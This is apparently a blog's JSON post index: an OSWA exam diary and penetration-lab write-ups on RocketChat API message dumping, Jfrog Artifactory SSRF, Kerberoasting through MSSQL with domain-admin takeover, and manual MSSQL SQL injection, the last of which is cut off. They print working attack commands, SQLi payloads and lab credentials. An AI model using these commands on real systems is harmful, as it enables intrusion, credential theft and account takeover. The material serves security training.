[ { "title": "My OSWA Journey - New Age Begins", "url": "/posts/OSWA/", "categories": "Blogging, OSCP, OSWA, Offensive Security", "tags": "EchoCTF, exploit-db, OSCP, OSWA, Hack the box, PwnTillDawn, Journey", "date": "2022-12-07 11:33:00 +0000", "snippet": "&amp;gt; What is WEB-200?? WEB-200 is an Offensive Security course that teaches students how to discover and exploit common web vulnerabilities, and how to exfiltrate sensitive data from target web applications. Students will obtain a wide variety of skill sets and competencies for web app assessments.Students who complete the course and pass the associated exam earn the Offensive Security Web Assessor (OSWA) certification, demonstrating their ability to leverage modern web exploitation techniques on modern applications. A certified OSWA candidate is prepared to take on the Advanced Web Attacks and Exploitation (WEB-300) course.&amp;gt; Side Story:..A lot of people think when you work at Offensive Security, you are given special privileges during an exam‚Ä¶ü§£ let me share with you a secret. There Is No Special Treatment for Any OffSec Employee. You Have to Read The Course Module, Take On The Labs, Book An Exam Through The Portal &amp;amp; Also You Will Have To Go Through Proctoring Verification &amp;amp; Your Exam Will be Proctored Until The End. There are no special privileges offered to Any OffSec Employees During Exams we all go through the same procedure just like every other student.&amp;gt; The Boring Story begins‚Ä¶..On May 6th 2022, I was granted access to Offensive Security Learn Unlimited which I started with PEN-300 journey. Two months into studying PEN-300, I realized I was not prepared for that exam since some part of this course is heavily dependent on C# programming. I took a step back asked myself these questions: How good is your C# skill?? Are your AD skills good?? Are you mentally prepared for OSEP?With these questions in mind, I decided it‚Äôs best to switch to a different a course while preparing myself for PEN-300. On August 12 2022, I started with WEB-200 course materials. As usual you know my style of doing things‚Ä¶ I jumped straight into pwning the labs without reading course materials. This method works best for me‚Ä¶ Why? Because from this, i will be able to test out what I know against what I am about to study. Few days into the lab, I got stuck on exploiting XSS vulnerability my first box. Oops thought I know it all got to jump back to the course materialü§™.&amp;gt; Fast Forward: Course Materials &amp;amp; Labs‚Ä¶..In the course materials, after trying my hands on some of the XSS example labs, I figured a way to exploit the XSS vuln. AT this point I knew exactly what to do/ the path to take‚Ä¶ This secret path is Try lab machine, get stuck then jump to course material and read on the related vulnerability. This continued for some time till I was able to fully compromise 3/5 lab machines. At this point, I stopped both reading the course materials and trying the lab machines. A friend advised the best way to see things clearer is to try looking at the problem from both sides. What this means is‚Ä¶ ‚Äúmaster the skill of identifying same vulnerabilities from different angles‚Äù. One of the best platforms to study web exploitations apart from the WEB-200materials is PortSwigger I quickly created an account, looked through the PortSwigger labs for topics that appear in the WEB-200 course material. I spent close to a 45 days on PortSwigger labs‚Ä¶ took much time that I anticipated because I had to manage work and study time. After spending 45 days on PortSwigger, I made a big progress solving a total of 60 labsIt‚Äôs time to test what I learnt from PortSwigger. Unfortunately, my focus was needed elsewhere (worküòä)‚Ä¶. Early October, the work load reduced and it was time for another ride. Jumped back to the labs with the knowledge I acquired from PortSwigger. I made good progress on the labs but guess what, the WEB-200 course materials has a lot of goodies in it. I had to return to the course material to read more on vulnerability discovery and exploitation techniques. Armed with good information from both Web-200 course material and PortSwigger labs as well as the support from the OffSec Discord channel, I finally compromised the remaining labs. 5/5 OSWA Labs compromised while I‚Äôve read through only 39.1% of the course materials.&amp;gt; Discussion: Course Material vs PortSwigger LabsAlright let me add my voice to this discussion‚Ä¶. I will start with PortSwigger labs, It is without any doubt that PortSwigger labs contain rich resources and it‚Äôs rated Number 1 on almost every blog that I have read but this doesn‚Äôt mean that you will do 100% fine without OffSec Lab Materials. In the Web-200 course content, I‚Äôve learned a lot more than I could imagine about exploiting web application vunerabilities. In short, it was an eye opener.OffSec did a great job in breaking down the explanations of all vulnerabilities and also provide exercise for all instances that‚Äôs mentioned in the course content. My best advice is: &quot;These platforms offer an opportunity to learn. As far as you are learning something new and beneficial from these platforms/materials, I don‚Äôt think there is a need to argue/compare which one is the best/better&quot; I have learnt a lot from these platforms and I will advise you to do same for your own good ü§ó Remember you are studying for yourself and not the communityüòú. Therefore, refrain from engaging in these poor arguments.&amp;gt; Exam Preparations &amp;gt; Note Taking and Site Bookmarking..While studying on both PortSwigger and the OSWA course materials, I made sure I wrote down all payloads I used in both exercises and labs. Most times, I will include a small detail explaining why a payload will work or fail (I will talk about this later). Let‚Äôs take a look at a sample of my notes:Using this method of note taking, I was able to accumulate a very big cheatsheet for web applications. Accurate note taking helped me a lot during my OSWA exam because there were instances where I will need to only copy and paste a payload with or without changing anything in the payload. This is a very important step and I will advise one shouldn‚Äôt rush to compromise/finish all the labs or exercises but rather taking your time to understand the vulnerability as well as discover multiple ways of exploiting that vulnerability.Having this in mind, I made sure I went through all the course material not leaving any stone unturned. On November 28 2022, I completed almost all topics in OSWA Course material.&amp;gt; Pre-Exam Tip..Never assume that a vulnerability won‚Äôt be included to an exam lab. Otherwise, you risk ending up stranded like me in the exam. Because, the vulnerability i least expected to see turned out to be present on one of my exam machines. I nearly failed my exam because I was of the mindset that ‚ÄúThere was no way it will show up.‚Äù Every vulnerability covered in the OSWA course is likely to be implemented on any exam machine‚Ä¶ My advice is: ‚ÄúStay concentrated, learn everything, understand everything, and be ready for everything.‚Äù&amp;gt; So It Begins: Booking ExamThe funny part was I got a little bit bored after completing the course materials and also PortSwigger labs so I decided to start playing with web applications from HackTheForce anytime I got stuck exploiting a vulnerability I will go knocking the doors of my good friend Kleiton Kurti ( a little secret ‚Äúhe‚Äôs a monster when it comes to webapps‚Äù üòú)‚Ä¶‚Ä¶ In a nutshell, I scheduled my OSWA Exam on December 3rd 2022 at 22:00 GMT as usual of me a night owlü¶â.Still not satisfied with HackTheForce instances, I decided to participate in PwnTillDawn Middle East &amp;amp; Africa CTF Competition as an exam stress test-run hoping i will find some web applications to testm my skills‚Ä¶The CTF took place from November 30 2022 to December 2nd 2022‚Ä¶ Remember my exam is scheduled on the December 3rd 2022. Luckily for me, I managed to win the competitionüéâüéäü•≥.&amp;gt; Exam D-Day: New Age BeginsOn December 3rd, 2022, I woke up at 9am (still stressed from the CTF), time to rest‚Ä¶. i hope so‚Ä¶. Well, here is my little secret: on days of execution, I try as much as possible to stay away from computers else I will end up trying to compromise vulnerable web instances. To avoid touching my laptop, i did some painting jobs at home‚Ä¶. At 2:00 pm GMT I took a short nap till 2:45 pm GMT then jumped back to painting work‚Ä¶At 8pm exactly, I turned on my laptop checking all VM Snapshots and notes. As usual I selected a music playlist from YouTube for the exam (morale Boosters). In case you want to know, here is the playlist: Jahmiel Success Scary Watch Video Sami Yusuf - Make Me Strong Watch Video Zootopia - Try Everything (Lyrics, Shakira) Watch Video At 9:30 pm GMT I logged into the proctoring tool, did all the necessary checks. Well!!! well!! well!‚Ä¶. the journey begins exactly at 10:15 PM GMT on December 3rd 2022.9hrs into the exam, I managed to acquire 50 points (3 local.txt &amp;amp; 2 proof.txt) all I need now is an extra 20 points to pass the exam. Everything was moving smoothly and I was happy about it, I even thought i will finish the exam in the next 3/4hrs little did I know that there was a HUGE roadblock ahead. On the quest for extra 20points, I got stuck for 7hrs on the remaining targets. Almost lost hope in compromising these targets because I tried everything I learnt but none worked. I knew I was missing a piece of information from the experience I had with the OSWA lab machines anytime you get stuck for a while there are two things involved. You are missing a piece of the puzzle You are trying to exploit a wrong vulnerability (Applicationg may be vulnerable to what you have in mind but that‚Äôs not the right vulnerability to exploit)19hrs into the exam, just when the I started to feel pressured and useless(i usually feel this way whenever things don‚Äôt go my way‚Ä¶ This usually inspires me to push beyond my limits), I saw a vulnerability that was staring right at me all that while. A vulnerability I least thought they will implement in an exam. Once discovered, I was able to exploit this vulnerability in less than 10mins to get local.txt. 30-40mins of enumerating, I achieved code execution on the target to retrieve proof.txt. hehehe now I have 70 points (3 proof.txt and 4 local.txt) which is the required pass mark. I took a step back to doublecheck all screenshots, comments and payloads in my notes that I will need for report writing. In the process of going through the screenshots in my notes, I saw something interesting in a wfuzz screenshot. I quickly accessed that page. Guess what, it was the missing piece I needed. 45 minutes of testing and firing my payloads I achieved Code execution and was able to retrieve the fourth proof.txt, As for the 5th target‚Ä¶. I Won‚Äôt talk about it. I spent 7hrs+ on it exploiting a vulnerability that I was certain was the intended path, just like my OSCP exam which I found a privilege escalation point but couldn‚Äôt exploit it, the same thing happened to me on this exam.80 points acquired, this is definitely a pass mark. The last and stressful part of the journey begins. Report writing i think is the most stressful part of an exam. Even if you are able to exploit all targets but you fail to make a good report, you are likely to fail. 20mins before the exam ended, I submitted the contents of proof.txt, used the remaining time to update my screenshots, comments and payloads in my notes. You should have seen the joy on my face hahaha I went back YouTube to listen to my favorite Jahmiel - Success ScaryOn Monday December 5th, 2022 at 6:30-7pm GMT I submitted my report. Am I the only one that get scared after submitting a report? I read through my report a couple of times before and after submitting. Trying to make sure I didn‚Äôt mess up anywhere. On Wednesday December 7 2022 I finally got the email I‚Äôve been waiting for.I am super excited to pass OSWA Exam on my first attempt. I will below are some unique resources that helped me throughout my OSWA journey. bastyn / OSWA kleiton0x00 Git-Repo HackTheForce Instances&amp;gt; Short AdviceMake sure to read through the course materials and try your hands on all the labs. Don‚Äôt forget to make notes while you‚Äôre going through that. Read bug hunting blogs too (maybe going too far) I did that and it helped me. From these blogs I picked up various techniques in identifying and exploiting web vulnerabilities.Remember always that ‚ÄúIn any given moment you have two choices: Step forward into growth or step back into safety‚Äù and also keep in mind that ‚ÄúThe hardest person you‚Äôll ever say goodbye to is the person you used to be‚Äù Step out of that comfort zone else you won‚Äôt grow. Always dare to dream. When you dream it and believe it, you will surely achieve it.&amp;gt; Special Thanks The Lord Our God for HIS Countless Blessings. üôè My mentors especially DataBus &amp;amp; W0tw0t for the motivation. ‚ù§Ô∏è My good friend Kleiton Kurti AKA Web-Monster üï∑Ô∏è The Ghanaian Team for their unwavering support ü§ó. The entire community of cybersecurity for their outstanding blogs and resources üë®‚Äçüíª." }, { "title": "Exploiting RocketChat [ Message Dump To RCE ]", "url": "/posts/Exploiting-RocketChat/", "categories": "Blogging, Exploiting", "tags": "writeups, rocketchat, dnspy, ssh, burpsuite, reversing", "date": "2022-01-15 10:45:00 +0000", "snippet": "&amp;gt; Information GatheringDuring our previous engagement on Exploiting Jfrog Artifactory webapp, we leaked some files from the development share. Today‚Äôs engagement, we will look at how to dump messages from the RocketChat webapp. But before we jump into this, we will have to reverse a windows binary. Not to waste time here, let‚Äôs get started‚Ä¶.In the previous blog, where we successfully leaked critical files from internal share to our repository /artifactory/robot/feedback/ directory. We found a windows executable called Feedbacks.exe, let‚Äôs grab the binary from the target.Executing the file command on the Feedbacks.exe binary reveals that we are dealing with a .NET binary. We will analyze this binary using a tool calleddnSpy.dnSpy is a debugger and .NET assembly editor. We can use it to edit and debug assemblies even if we don‚Äôt have any source code available. We can grab this dnSpy tool from dnSpy GitHub page. Loading the Feedbacks.exe binary into dnspy shows that there is a namespace called RocketChatLogger and a function called GetFeedback that is executing a web request.Investigating the GetFeedback function reveals that an API call is being made to a RocketChat server, which extracts messages from a channel ID and saves them locally to a text file called Feedback.txt. We also spotted that there is a user ID assigned to X-User-Id and a key assigned to X-Auth-Token all within the X-Auth-Id headerJudging from how the binary was written, the actual API key can be leaked through active debugging of the program in dnSpy. All we need is to set a breakpoint on the GetFeedback function, run the debugger then submit the contents of key.txt as an argument. The contents of key.txt was 111091166030218062251222010115128136114113076235134212137064020174229081049098149097150097197008100104224193046241175229075026048009246089192212After submitting the contents of key.txt as an argument, the debugger will continue running the application until it hit the breakpoint we set earlier. Once that is completed, the decrypted API key can be found in the local variables section. Our decrypted key is &quot;_bXOx5rjOpTOE3hEfJNTzjAdTWEFas2um7xNH13ylZL&quot;&amp;gt; Exploitation PhaseNavigating to port 3000 which we found earlier from our nmap scan revealed that Rocket.Chat webapp is hosted on that port. Login form requires a user email &amp;amp; password but in this case we have none moreover New user registration is disabled Reading through the i realized one can grab all user list on the target by visiting /api/v1/users.list page. When we did, we got an error message which states that we must be logged in to display such content. How do we log in?? After digging for a while i realized that with a valid user ID and API key, it‚Äôs possible to construct API calls to extract information from the RocketChat server. We will use burpsuite to capture the request and modify the Headers to include both X-User-Id &amp;amp; X-Auth-Token. The API endpoints that we will be targeting is well documented and can be found at developer.rocket.chat website The first endpoint we will target is the /api/v1/users.list. More info can be found hereWe found some usernames but that didn‚Äôt bear any fruit for us. Digging deeper, i tried to grab all channels names from the chat server, their respective IDs in order to retrieve the messages found on each channel. We Found 4 channels on the chat server. From the docs, channels list are found at /api/v1/users.list after visiting that link we found 4 channels: hr_announcements, development_requests, gaming &amp;amp; infra {&quot;_id&quot;:&quot;sPPBSQskQ4afSmMeJ&quot;, &quot;name&quot;:&quot;hr_announcements&quot;},{&quot;_id&quot;:&quot;eoxPkMvnBNCB8q9n8&quot;, &quot;name&quot;:&quot;development_requests&quot;},{&quot;_id&quot;:&quot;RDZXJPcnu76Tk4EHE&quot;, &quot;name&quot;:&quot;gaming&quot;},{&quot;_id&quot;:&quot;fBMPnhN5wWv96tNBp&quot;, &quot;name&quot;:&quot;infra&quot;}The hr_announcements channel is a place to look at as many HR announcements contain key information about the organization. Information such as on-boarding information and other details that can be used in subsequent attacks. To access the hr_announcements channel messages, we sent a GET request to /api/v1/channels.messages?roomId=sPPBSQskQ4afSmMeJThe hr_announcements channel messages contained a juicy information. The information stated that: &quot;msg&quot;:&quot;Attention new employees: Please be sure to check the #onboarding_information channel.&quot;,&quot;ts&quot;:&quot;2019-11-17T06:32:40.825Z&quot;,. So it looks like there is a group called #onboarding_information, to find groups on the chat server, we will send a request to /api/v1/groups.listHehehe we found the group #onboarding_information exists and we found the group ID too &quot;_id&quot;:&quot;2iHYAhwtJjbyj4a6N&quot;,&quot;name&quot;:&quot;onboarding_information&quot;,&quot;fname&quot;:&quot;onboarding_information&quot;. The next step is to read messages from this group chat. How do we do that? we need to send a request to the group ID so the url will be /api/v1/groups.messages?roomId=2iHYAhwtJjbyj4a6N and from that we will be able to retrieve all messages sent to that group. Other groups that were found include: developers_chat, development_projects, known_issues &amp;amp; timeline_updates A workstation credentials can be discovered from one of the messages. However, the password Welcome_roundsoft123 does not work for any of the users listed in RocketChat. Let‚Äôs dig deeper into the data to see if there is any more information that is of use. To achieve this, we grabbed the message ID and made a request to /api/v1/chat.getMessage?msgId=3mbfjW4TXPs4BQQvs and we can spot the mentioning of a credentials issue. This discussion can be enumerated to reveals more information by making a request to the Drid ID.Sending a GET request to the Drid ID of the previous message, we are able to pull out all messages from that discussion. Voila we found another password from the discussion Welcome_roundsoft2019! but the password does not work against any of the systems we have found. We can set this aside as well for potential use later.Nothing interesting found so far from the messages, so went back to the docs and from the docs, i realized we can query for instant messages. To do this we need to send a request to /api/v1/im.list. This revealed a new instant message ID.Drilling into this new Instant Message ID, we can reveal the content of the conversation. We made another request to the Instant Message ID which is /api/v1/im.messages?roomId=HTpmn63zyESXXsGZackBN4uDvbKecTqoBS. This led to the discovery of a Unix machine username beta_user from the conversation.From the start, we discovered a group name developers_chat and looking at the new Unix user we just found beta_user which was mentioned by the user dev-admin user, We enumerated the developers_chat group. We know the group name already to make our work simple, we sent a request to /api/v1/groups.messages?roomName=developers_chat. Going through the messages, we discovered the presence of an uploaded text file which contains a key and requires an appropriate username before one can gain access to the development networkKnowing the path and the name of this interesting attachment, we can grab the contents of this file by sending a request to /file-upload/crBDvzQkhN77KLrxz/key.txt. This interesting key.txt attachment turns out to be an id_rsa key for a user.Id_rsa keys belong to ssh services. We found a Unix user already beta_user from the developers_chat. What‚Äôs next? The good old changing of permissions and logging into the target using the id_rsa key. We gained access to the target finally. Hehehe we all know the wide smiles we have on our faces after getting foothold on a target. &amp;gt; Credits:I almost gave up on this webapp because it was too complicated. It pays to have a good number of friends around you who believe in you, encourage you and always fuel your can-do spirit. A big shoutout to W0tW0tü§©, Th3D00msl4y3rüôå &amp;amp; the geeky fella TheCyberGeeküòé these guys kept me on my toes and made sure i never gave up until this webapp was exploited.I hope you enjoyed the ride and also discovered something new. Kindly subscribe to my YouTube channel for more contents" }, { "title": "Exploiting Jfrog Artifactory [ Server-side Request Forgery ]", "url": "/posts/Exploiting-Jfrog-Artifactory/", "categories": "Blogging, Exploiting", "tags": "writeups, jfrog, burpsuite, smb, bruteforce, ssrf, hydra, smb shares, CVE-2019-19937", "date": "2022-01-14 21:50:00 +0000", "snippet": "&amp;gt; Information GatheringFrom nmap scan, we found a web app running on port 8081. Navigating to port 8081 on the browser, we discovered Jfrog Artifactory running on the target and we were redirected to a login page.Reading Jfrog Artifactory Docs revealed the default admin username access-admin and one can change the admin password one is unable to obtain administrator access, one will need to recreate the default administrator user in order to be able to manage users of your system. This is done by using the following REST API call on the Access service, through Artifactory as its proxy.The issue at hand is we need to find the admin password before we will eb able to reset the administrators password. There is only one thing that comes in this situation which is bruteforcing. Why bruteforcing? remember we have a username access-admin already and we need to find his password to reset admin password.Bruteforcing the access-admin user account led to the discovery of his password Password12. What will you do in this situation?? try to login right? Well i did that and it failed because access-admin has UI access disabled.From the Jfrog docs, we found out that when we visit /artifactory/api/access/api/v1/users we will be able to retrieve all of the users in the system and their information. But to do this, we must first submit credentials to the HTTP form found on the /api page. The credentials we found earlier on will work on this form. Username: access-admin &amp;amp; Password: Password12After logging in, and visiting the /artifactory/api/access/api/v1/users link, we were able to pull down a full list of users on the target. The two main users found on the target are access-admin &amp;amp; admin.Since we now know the admin username, we can recreate the default administrator account. How?? Jfrog Official docs says it all. To achieve this, we need the password for access-admin user which we have already. All requirements satisfied, i executed the command curl -u access-admin:Password12 -X PATCH &quot;http://10.13.38.19:8081/artifactory/api/access/api/v1/users/admin&quot; -H &quot;Content-Type: application/json&quot; -d &#39;{&quot;password&quot;:&quot;Rgang12345&quot;}&#39;. With this command, i will be able to change the admin password.Password changed successfully all i need to do is login with the credentials Username: admin &amp;amp; Password: Rgang12345. With the admin user password changed, it is now possible to log into the UI with administrative privileges. It worked and we are able to login to the Jfrog UI as admin user with administrative privileges on the target. What‚Äôs next? we have access what can we do? Well, this is the part the real challenge begins.&amp;gt; ExploitationExploring the Jfrog application, Clicking on the Admin Section and selecting System Logs section, we found various logs, through these logs, we gained information about the application server as well as the internal network. The access.log and request.log file both indicated an internal IP address block of 192.168.125.x.Target internal IP structure leaked what can we do with this information? we will look at that later. The next thing i did was to create a repository. To do this Click Admin =&amp;gt; local repositories =&amp;gt; Generic =&amp;gt; Save name your repository then save.The Jfrog application contains functionality to import local repositories. Digging deep into this functionality revealed that it is prone to a server-side request forgery vulnerability CVE-2019-19937 with this information, i fired up burpsuite and tried to import the robot repository i created. Click Admin =&amp;gt; Import &amp;amp; Export =&amp;gt; Repositories =&amp;gt; Import Repository from Path =&amp;gt; Select Repository =&amp;gt; C:\\artifactory-oss-6.13.1\\logs.By modifying the &quot;path‚Äù value to use a UNC path, it is possible to scan the internal network using prior information about the network scheme. This can be used to determine live hosts, and also to determine if there are any shares that are accessible by the user is whose context Jfrog is running in. The image is an example of the original request to import the C:\\artifactory-oss-6.13.1\\logs folder into a robot repository:Sending this captured request to Burp Intruder, the &quot;path&quot; is modified to contain UNC paths of internal IP addresses we found. The last octet will be used as a fuzzing point, allowing us to scan the internal network. The response times can be monitored to determine which hosts are alive.In burpsuite, we set the payload type to numbers with the range of 2-255. From the burpsuite fuzzing response, we noticed that a longer response time from the target in the fuzzer indicates that the host is not alive (or not accessible), while a short response time indicates an accessible host. From this, we discovered 3 alive hosts which are 192.168.125.88, 192.168.125.128 &amp;amp; 192.168.125.129Weaponizing ourselves with the discovered hosts, we will setup another burpsuite Intruder payload to discover shares on the target. We imported the following wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt into burpsuite. A 200 response code indicates that a share exists on the target.We found nothing on IP addresses 192.168.125.88 &amp;amp; 192.168.125.128 but on 192.168.125.129, we found some interesting shares forums_old, Projects &amp;amp; development that are accessible. The development share looks interesting so we will try to import this repository. to achieve this, we have to follow this chain Click Admin =&amp;gt; Import &amp;amp; Export =&amp;gt; Repositories =&amp;gt; Import Repository from Path =&amp;gt; Select Repository =&amp;gt; \\\\\\\\192.168.125.129\\\\developmentThis successfully imports the contents of the development share into the robot repository.To examine the imported share in the robot repository we have to access /artifactory/robot/ and this displays the files from the development share.In the /artifactory/robot/feedback/ directory, we found feedback.exe and a key.txt file. In the next blog that will be published, we will dig deep into the feedback.exe and also discuss how it will lead to the exploitation of an application.&amp;gt; CreditsA big shoutout to my mentor Keramas‚ù§Ô∏èüôå Without this blog that he published, i would have never found a way around this web application. I got stuck for weeks.I hope you enjoyed the ride and also discovered something new. Kindly subscribe to my YouTube channel for more contents" }, { "title": "Kerberoasting Using Mssql Server [ Abusing GenericAll ]", "url": "/posts/Kerberoasting-Using-Mssql-Server/", "categories": "Blogging, Exploiting", "tags": "writeups, mssql, impacket-mssqlclient, hashcat, xp_cmdshell, powerview, evil-winrm, kerberoast, bloodhound, nmap", "date": "2022-01-13 13:33:00 +0000", "snippet": "&amp;gt; Information GatheringFrom The previous writeup on Abusing MSSQL Linked Servers, we found credentials on the target. In this chapter, we will look at how we can perform kerberoast attacks through MSSQL Server. During our previous engagement, we found credentials using sp_execute_external_script. &amp;lt;authentication mode=&quot;Forms&quot;&amp;gt; &amp;lt;forms name=&quot;login&quot; loginUrl=&quot;/admin&quot;&amp;gt; &amp;lt;credentials passwordFormat = &quot;Clear&quot;&amp;gt; &amp;lt;user name=&quot;Administrator&quot; password=&quot;EverybodyWantsToWorkAtP.O.O.&quot; /&amp;gt; &amp;lt;/credentials&amp;gt; &amp;lt;/forms&amp;gt; &amp;lt;/authentication&amp;gt;The question is what can we do with this credential?? Well, we are not out of options. I checked the ipaddress of the target MSSQL Server is running on using sp_execute_external_script command EXEC sp_execute_external_script @language = N&#39;Python&#39;, @script = N&#39;import os;os.system(&quot;ipconfig&quot;);&#39;; . Looking at IPV4 IP address, there was no service that we could connect to remotely with the credentials we have. So, i decided to dive deep into the IPV6 address.A quick nmap scan was performed on the IPV6 IP address. Port 5985 (Windows Remote Management) was open. Good news at last all we need to do is add the IPV6 IP address to /etc/hosts file dead:beef::1001 targetipv6. Henceforth, when i type targetipv6 i am referring to dead:beef::1001 address.I connected to WinRM using evilwinrm tool. The command executed to connect to WinRM was evil-winrm -i targetipv6 -u Administrator -p &#39;EverybodyWantsToWorkAtP.O.O.&#39;Digging around using winpeas and some few post enumeration tools didn‚Äôt yield any positive results. So, i decided to enumerate the domain to find privilege escalation paths but i realized we can‚Äôt query the domain from alocal administrator account from the errors i encountered.However, the SQL service account can be use instead since service accountsautomatically impersonate the computer account, which are members of the domain and effectively a special type of user account. I logged into MSSQL using impacket-mssqlclient with the SA User we added in the previous post and enabled xp_cmdshell to query domain users with command xp_cmdshell net users /domain. BloodHound is an application developed with one purpose: to find relationships within an Active Directory (AD) domain to discover attack paths. With this said, we will grab SharpHound.exe from BloodHoundAD GitHub page. Create the C:\\temp\\ directory first then upload the SharpHound.exe to the target using our evil-winrm session.Then the next step is to collect all information about the Active Directory (AD) domain through mssql using the command xp_cmdshell C:\\temp\\SharpHound.exe -C All --outputdirectory C:/temp.Once information about the target Active Directory (AD) domain is collected and saved into a zip file, we then download the zip file using evil-winrm download command.Install BloodHound GUI and upload the zip file you downloaded. Note: you can install bloodhound GUI from BloodHound Docs.After uploading the zip file to bloodhound UI for visualization. We can use pre-built queries to find any quick privilege escalation vectors. Clicking on the Shortest Paths to Domain Admins from Kerberoastable Users entry shows the following.The user p00_adm is a member of help desk and has GenericAll privileges on the Domain Admins group. This means that we can add any user to Domain Admins if we have p00_adm credentials. To accomplish this, we need to kerberoast the p00_adm user and try to crack his hash. We can use the Invoke-Kerberoast.ps1 from EmpireProject GitHub page.&amp;gt; What is Kerberoasting??: Kerberoasting is a post-exploitation attack that extracts service account credential hashes from Active Directory for offline cracking. It is used to crack a Kerberos (encrypted password) hash using brute force techniques. If successful, it can crack NTLM hashes in a few hours and provide the adversary with a clear-text passwordDownload the Invoke-Kerberoast.ps1 script, upload it to C:\\temp\\ directory using Evil-winrm session like we did to the SharpHHound.exe binary. Once we have the .ps1 uploaded, we can invoke our kerberoast attack through MSSQL using the command xp_cmdshell powershell.exe -c &quot;Import-Module C:\\temp\\Invoke-Kerberoast.ps1; Invoke-Kerberoast -OutputFormat hashcat&quot;We found two hashes p00_hr &amp;amp; p00_adm. Keep in mind that we are after p00_adm user hash therefore i copied the p00_adm user hash to a file and made sure that i deleted the spaces and empty lines from the hash. p00_adm. The hash can be cracked using Hashcat command hashcat -m 13100 hashes /usr/share/seclists/Passwords/Keyboard-Combinations.txt --force. Lucky us! we were able to crack the password. Note: this took a very long time since i had to try a variety of wordlist until i got the password The password for p00_adm is ZQ!5t4r.What else now?? well we have p00_adm user plaintext password and we can impersonate the p00_adm with the help of PowerView. How do we achieve this? first let‚Äôs grab PowerView.ps1 from PowerShellEmpire GitHub page and upload it to the target using evil-winrm. Once The PowerView.ps1 script is uploaded, the next thing to do is to import the file so we will have access to PowerView extended commands like Add-DomainGroupMember, Get-DomainComputer‚Ä¶..etc.All done?? what‚Äôs next?? We need to use a credential object to impersonate p00_adm user. Execute this command$user=&#39;p00_adm&#39;$pass=&#39;ZQ!5t4r&#39;$p= ConvertTo-SecureString -AsPlainText $pass -force$cred=New-Object System.Management.Automation.PSCredential -ArgumentList $user,$pAfter impersonating p00_adm user, i still had issues logging in so i searched for Domain Admins on the target using the command get-netuser -DomainController dc -Credential $cred. From this, i found out the user mr3ks is part of the Domain Admins Group.&amp;gt; Abusing GenericALLLooking back at the BloodHound GUI, to abuse GenericAll, i right-clicked on the GenericAll line, selected help and then Abuse. This Feature of BloodHound GUI explains how we can abuse this feature.What can we do now? well, we can change the credentials for mr3ks user. The question is how do we do that?? remember i just said BloodHound GUI explains everything. I executed this command$Username = &#39;p00_adm&#39;$Password = &#39;ZQ!5t4r&#39;$Connect = ConvertTo-SecureString -AsPlainText $Password -Force$Auth = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$ConnectSet-DomainUserPassword -Identity mr3ks -Password $Connect -Credential $AuthWe encountered no errors that‚Äôs good news to the eyes. Let‚Äôs try to connect to the target through the target IPV6 Win-RM service. To achieve this, i executed evil-winrm -i targetipv6 -u mr3ks -p &#39;ZQ!5t4r&#39;. Hehehe we are logged in and we have fully compromised a Domain Admin account.I hope you enjoyed the ride and also discovered something new. Kindly subscribe to my YouTube channel for more contents" }, { "title": "Manual SQLi On MSSQL [ Creating Jobs With Mssql ]", "url": "/posts/Mssql-Jobs/", "categories": "Blogging, Exploiting, Web Applications", "tags": "writeups, sqli, sql injection, burpsuite, shell, xp_cmdshell", "date": "2021-12-17 10:18:00 +0000", "snippet": "&amp;gt; Information GatheringSQL injection aka SQLi is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application‚Äôs content or behavior. More information on PortSwiggerOn port 80, we can see an amazing web application that‚Äôs meant for booking trips. It‚Äôs safe to assume that this is a travel agent website where one can book a destination to a desired location. The target website appears to have static webpages except the book-trip.php page. On this page we are presented with a login form which has 3 fields. 1. Destination, 2. Adults &amp;amp; 3. Children.In SQLi, there are few characters that are capable of triggering an error in a database. These characters are *, &#39;, &quot; &amp;amp; a few others. In this engagement, we will use a single &#39; quote to test all fields. It‚Äôs always best to test one field at a time, so let‚Äôs put single quote &#39; in the destination field and capture the request in burpsuite for further testing.Pushing the request to burpsuite forwarder, and sending the request again, we were able to trigger a sql error. From the response in burpsuite, the error displayed is Message: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Unclosed quotation mark after the character string &#39;&#39;. &amp;amp; Message: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Incorrect syntax near &#39;&#39;.The destination field is vulnerable to sql injection. To further exploit this vulnerability, we need to find the number of columns on the target. In SQL, the query Order by is used to sort the result-set in ascending or descending order.. To accomplish this, we will modify the data in our request destination=&#39;+order+by+1+--&amp;amp;adults=1&amp;amp;children=1. Note: we will keep increasing the values till we find the right columns on the target.The target database has 5 columns which can be confirmed from the image above. The reason for performing an SQL injection UNION attack is to be able to retrieve the results from an injected query. Generally, the interesting data that you want to retrieve will be in string form, we need to find one or more columns in the original query results whose data type is, or is compatible with, string data. To test this, we will modify our data destination=&#39;+UNION+SELECT+&#39;a&#39;,2,3,4,5+--&amp;amp;adults=1&amp;amp;children=1. We will keep testing until the alphabets we submitted appears in the webapp response.We found the relevant columns that are suitable for retrieving string data. We have all that we need now the next step is to start extracting information from the database. For starters, let‚Äôs start with the version of SQL server running on the target. We can achieve this using destination=&#39;+UNION+SELECT+1,&#39;a&#39;,(SELECT+@@version),3,4+--&amp;amp;adults=1&amp;amp;children=1We can further enumerate the target database to retrieve information but it‚Äôs unfortunate i won‚Äôt dive deep into that. For more information on how to enumerate the database manually, you can check at perspectiverisk. For now, let‚Äôs focus on to enable xp_cmdshell on the target.After trying for some time to enable xp_cmdshell manually, i hit a dead-end. I tried all that i know and also followed the steps on both mssqltips &amp;amp; medium.com as well as few others, i failed. I decided to use the automatic method since i know the injection point, it‚Äôs easier to do it with sqlmap.Using sqlmap didn‚Äôt do any good. I tried bypassing this feature with some few sqlmap arguments but i still failed. Looking at the screenshot above, sqlmap presented us with this error[02:00:34] [WARNING] xp_cmdshell creation failed, probably because sp_OACreate is disabled[02:00:34] [CRITICAL] unable to proceed without xp_cmdshell&amp;gt; Creating MSSQL Jobs Through SQLiThe question is ‚Äúhow do we do this?? is it even possible??‚Äù?? The answer is YES it is possible have you heard about T-SQL??T-SQL (Transact-SQL) is a set of programming extensions from Sybase and Microsoft that add several features to the Structured Query Language (SQL), including transaction control, exception and error handling, row processing and declared variables.T-SQL identifiers, meanwhile, are used in all databases, servers, and database objects in SQL Server. These include the following tables, constraints, stored procedures, views, columns and data types. T-SQL identifiers must each have a unique name, are assigned 